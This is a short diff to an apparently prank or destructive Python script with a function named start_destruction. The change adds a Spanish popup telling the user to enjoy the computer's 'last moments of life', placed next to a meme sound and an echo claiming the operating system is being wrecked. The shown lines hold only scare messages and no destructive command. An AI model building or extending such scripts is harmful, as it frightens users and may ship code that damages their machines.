@@ -1,7 +1,7 @@
 from os import system
 from colorama import Fore
 from playsound import playsound
-
+from tkinter import messagebox
 def start_destruction():
      try:
           print(Fore.GREEN, """
@@ -45,7 +45,7 @@ def start_destruction():
 
 #         Empieza a sonar el among drip descargado     
           playsound('amogus.mp3')
-
+          messagebox.askquestion(title="Sigues ahi?", message="Sigues usando el pc? disfruta sus  ultimos instantes de vida")
 #         Imprime el siguiente mensaje en pantalla
           system('echo "FOLLANDONOS EL SISTEMA OPERATIVO..."')
 
